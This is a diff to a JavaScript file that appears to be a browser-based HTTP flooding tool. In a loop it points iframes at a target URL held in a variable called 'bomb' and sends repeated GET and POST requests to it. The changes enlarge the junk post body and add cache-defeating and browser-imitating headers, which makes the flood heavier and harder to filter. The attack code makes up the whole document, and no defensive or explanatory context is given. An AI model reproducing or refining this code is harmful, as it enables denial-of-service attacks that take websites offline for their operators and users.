@@ -22,7 +22,7 @@
 	var method="POST";
 	var method2="GET";
 	var async="true"
-	var postdata="Iloveyou";
+	var postdata="qawsedrftgyhujikolpaqwsedrftgyhujikolpaqwsedrftgyhujikolp";
 	var xhr = new XMLHttpRequest();
 	var xhr2 = new XMLHttpRequest();
 	function main()
@@ -70,13 +70,15 @@
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			bomb = m_stBomburl;
+			//XMLHttpRequest_GET
 			xhr2.open(method2, bomb, async);
-	    	xhr2.setRequestHeader("Pragma", "no-cache");
- 			xhr2.setRequestHeader("Cache-Control", "no-cache");
+	    		xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  			xhr2.send();
 			m_ifFrame[i].setAttribute("src", bomb);
-            //XMLHttpRequest
+            		//XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			xhr.send(postdata);
